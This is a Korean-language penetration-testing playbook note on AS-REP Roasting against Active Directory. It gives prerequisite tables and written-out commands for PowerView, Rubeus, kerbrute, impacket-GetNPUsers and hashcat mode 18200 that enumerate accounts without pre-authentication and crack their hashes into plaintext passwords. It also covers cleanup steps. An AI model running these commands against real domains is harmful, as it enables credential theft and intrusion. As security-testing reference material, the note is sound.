---
tags:
  - 환경/ad
  - 서비스/kerberos
시작조건: ["명령 실행 위치에서 DC Kerberos 88 접근 가능", "도메인명과 사용자 후보 확보"]
필요권한: ["도메인 사용자 권한 불필요"]
필요조건: ["도메인명", "유효 사용자명 또는 사용자 목록", "Kerberos pre-authentication 미요구 계정"]
결과: ["대상 사용자의 AS-REP hash", "크래킹 성공 시 대상 사용자의 평문 비밀번호"]
---

# AS-REP Roasting

## 한 줄 판단

Kerberos 사전 인증(pre-authentication)을 요구하지 않는 도메인 사용자를 알고 있다면 공격자 계정 없이 AS-REP hash를 요청하고, 대상 사용자의 비밀번호를 오프라인으로 복구할 수 있는지 확인한다.

## 전제 조건

먼저 **명령을 실행할 위치에서 DC의 88번 포트에 접근할 수 있는지** 확인한다.

`<DC_IP>`는 KDC의 IP, `<DOMAIN>`은 Kerberos realm에 대응하는 DNS 도메인, `<TARGET_USER>`와 `<USER_LIST>`는 사전 인증 제외 여부를 확인할 대상이다. `<ASREP_HASH_FILE>`·potfile·wordlist는 Linux 또는 Windows 분석 호스트의 경로이며 hash는 대상 사용자의 NT hash가 아니다.

```bash
nc -vz <DC_IP> 88
```

```powershell
Test-NetConnection <DC_IP> -Port 88
```

| 확인할 것 | 필요한 상태 | 충족하지 않을 때 |
|---|---|---|
| DC Kerberos 접근 | `nc`의 `succeeded`·`open` 또는 `TcpTestSucceeded: True` | DC에 접근 가능한 내부 호스트에서 실행하거나 [[내부망 경로 확보 후 피벗 구성]] |
| 명령 실행 위치 | Kali 또는 제어 중인 내부 호스트 중 DC:88에 닿는 위치 | 도메인 가입 호스트가 존재하기만 하고 명령 실행·피벗이 불가능하면 조건 미충족 |
| 요청자 계정 | 도메인 계정이나 TGT 불필요 | 해당 없음 |
| 입력 정보 | 도메인명과 유효 사용자명 후보 | SMB·LDAP·Kerbrute 등으로 도메인과 사용자 후보를 먼저 확인 |
| 대상 계정 | `DONT_REQ_PREAUTH`가 설정된 도메인 사용자 | 다른 사용자 후보 확인 또는 이 기법 종료 |

### 요청자와 대상 계정 구분

| 역할 | 필요한 상태 | 비밀번호 복구 대상 |
|---|---|---|
| 요청자 | 도메인 계정 없이 도메인명·사용자명 후보와 KDC 접근만 확보 | 해당 없음 |
| 대상 사용자 | AD에 존재하고 `DONT_REQ_PREAUTH`가 설정된 계정 | 대상 사용자의 비밀번호 |

정리하면 공격 호스트의 도메인 가입 여부는 중요하지 않다. **DC:88에 닿는 위치에서 명령을 실행할 수 있고 도메인명과 사용자명 후보가 있으면** 요청을 시작할 수 있다.

## 실행

1. 인증된 Windows 세션이 있으면 `DONT_REQ_PREAUTH` 계정을 먼저 좁힌다.
2. Rubeus, Kerbrute 또는 `impacket-GetNPUsers`로 AS-REP를 요청한다.
3. `$krb5asrep$` hash가 반환된 경우에만 Hashcat으로 오프라인 크래킹한다.
4. 평문이 복구되면 자격 증명 상태로 전환하고 실제 사용 범위는 별도 검증한다.

AS-REP 응답에 TGT가 포함될 수 있어도, 여기서 저장하는 `$krb5asrep$` 문자열은 응답의 암호화 부분을 오프라인 분석 형식으로 만든 자료다. 이를 현재 세션에서 사용할 수 있는 TGT나 서비스 인증 성공으로 해석하지 않는다. ticket·cache·서비스 접근의 경계는 [[Kerberos 인증 자료와 서비스 접근]]을 따른다.

### Windows 공격 호스트에서 실행

#### PowerView로 대상 계정 확인

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

확인할 출력:

- `useraccountcontrol`의 `DONT_REQ_PREAUTH`.
- 이 결과는 취약 설정 후보이며, AS-REP hash 반환과 비밀번호 복구 성공을 각각 따로 확인한다.

#### Rubeus로 AS-REP 요청

`<ASREP_HASH_FILE>`은 작업 전 존재하지 않는 exact 경로를 선택한다.

```powershell
Test-Path -LiteralPath '<ASREP_HASH_FILE>'
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat /outfile:<ASREP_HASH_FILE>
Test-Path -LiteralPath '<ASREP_HASH_FILE>'
```

확인할 출력:

- `AS-REQ w/o preauth successful!`.
- `<ASREP_HASH_FILE>`에 한 줄로 저장된 `$krb5asrep$` 형식 hash. `Test-Path`는 실행 전 `False`, 요청 성공 후 `True`여야 한다.

### Linux 공격 호스트에서 실행

#### Kerbrute로 사용자 열거와 AS-REP 확인

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_LIST>
```

확인할 출력:

- `VALID USERNAME`은 사용자명 확인 결과일 뿐 AS-REP 수집 성공이 아니다.
- `has no pre auth required. Dumping hash to crack offline`와 이어지는 `$krb5asrep$` hash를 함께 확인한다.

#### impacket-GetNPUsers로 사용자 목록 확인

```bash
test ! -e '<ASREP_HASH_FILE>'
impacket-GetNPUsers '<DOMAIN>/' -dc-ip <DC_IP> -no-pass -usersfile '<USER_LIST>' -format hashcat -outputfile '<ASREP_HASH_FILE>'
```

확인할 출력:

- `$krb5asrep$` 형식 hash가 반환된 사용자.
- `doesn't have UF_DONT_REQUIRE_PREAUTH set`은 해당 사용자가 이 공격 조건을 충족하지 않는다는 뜻이다.

#### Hashcat으로 오프라인 크래킹

```bash
test ! -e '<ASREP_POTFILE>'
hashcat -m 18200 '<ASREP_HASH_FILE>' '<WORDLIST>' --potfile-path '<ASREP_POTFILE>' --restore-disable --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- `Status...........: Cracked`와 `Recovered........: 1/1`.
- hash 뒤에 표시되는 복구 비밀번호.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `DONT_REQ_PREAUTH`만 확인됨 | 취약 설정 후보이나 hash는 아직 없음 | AS-REP 요청 후보 | Rubeus 또는 `impacket-GetNPUsers`로 실제 hash 반환 확인 |
| Kerbrute의 `VALID USERNAME`만 확인됨 | 유효 사용자명만 확인됨 | 사용자 후보 | AS-REP hash가 함께 반환되는지 확인 |
| `$krb5asrep$` hash 반환 | pre-authentication 미요구 계정의 AS-REP 수집 성공 | 오프라인 크래킹 가능한 hash | [[오프라인 해시 크래킹]] |
| `doesn't have UF_DONT_REQUIRE_PREAUTH set` | 해당 사용자는 취약 조건을 충족하지 않음 | hash 미획득 | 다른 사용자 후보를 확인하거나 이 기법을 종료 |
| Hashcat `Status: Cracked`와 평문 출력 | 비밀번호 복구 성공 | 도메인 자격 증명 후보 | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| Hashcat 크래킹 미완료 | AS-REP hash는 있으나 평문을 복구하지 못함 | hash만 확보 | wordlist 적합성을 재평가하고 취약 설정을 발견 사항으로 기록 |

## 변경 영향과 복구

이 절차는 AD 객체의 `DONT_REQ_PREAUTH`를 변경하지 않지만 KDC 감사 기록과 공격·분석 호스트의 hash·potfile을 남긴다. 실행 전 없음을 확인한 작업 경로만 사용하고, 사용 후 이번 작업에서 생성한 exact 파일만 제거한다.

```bash
rm -f -- '<ASREP_HASH_FILE>' '<ASREP_POTFILE>'
test ! -e '<ASREP_HASH_FILE>' && test ! -e '<ASREP_POTFILE>'
```

```powershell
if (Test-Path -LiteralPath '<ASREP_HASH_FILE>') { Remove-Item -LiteralPath '<ASREP_HASH_FILE>' -Force }
Test-Path -LiteralPath '<ASREP_HASH_FILE>'
```

- Linux 확인은 두 `test` 모두 종료 코드 `0`, Windows 확인은 `False`여야 파일 정리가 완료된 것이다.
- KDC 감사 기록은 복구 대상이 아니며 삭제하지 않는다.
- `GenericWrite`·`GenericAll`로 pre-authentication 설정을 임시 변경해야 한다면 이 문서에서 섞어 실행하지 않고 [[임시 DONT_REQ_PREAUTH 설정과 AS-REP 요청]]에서 기준선·짧은 변경 창·즉시 복구를 함께 수행한다.

## 확인할 출력과 권한

- `$krb5asrep$` 반환은 AS-REP 수집 성공이며 평문 비밀번호나 서비스 접근 성공을 의미하지 않는다.
- `VALID USERNAME`과 `DONT_REQ_PREAUTH`는 서로 다른 상태다.
- 공격자가 사용할 유효한 도메인 계정은 필요하지 않지만, 공격 대상은 AD에 존재하는 도메인 사용자여야 한다.
- 공격 호스트의 도메인 가입 여부와 요청자에게 도메인 인증 수단이 필요한지는 별개의 조건이다.
- Hashcat의 `Cracked`와 복구 평문이 확인된 뒤에도 실제 서비스 접근과 권한은 별도로 검증한다.
- `GenericWrite` 또는 `GenericAll`로 pre-authentication 설정을 변경하는 경로는 대상 계정 상태를 바꾸므로 이 조회·수집 절차에 포함하지 않는다.

## 관련 서비스

- [[Kerberos 서비스]]
- [[LDAP 서비스]]

## 관련 도구

- [[PowerView]]
- [[rubeus]]
- [[kerbrute]]
- [[impacket-GetNPUsers]]
- [[hashcat]]

## 비교 기법

- 유효한 도메인 계정 또는 TGT로 SPN 계정의 서비스 티켓을 요청할 때: [[Kerberoasting]]
- 대상 사용자 객체를 제어해 pre-authentication 설정을 잠시 바꿔야 할 때: [[임시 DONT_REQ_PREAUTH 설정과 AS-REP 요청]]

## 관련 상태 라우터

- 평문 비밀번호를 복구했으면: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- hash를 복구하지 못했거나 다른 AD 후보를 확인할 때: [[AD Identity 확인 후 도메인 컨텍스트 열거]]

## 참고 링크

- [Microsoft: UserAccountControl property flags](https://learn.microsoft.com/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [Rubeus](https://github.com/GhostPack/Rubeus)
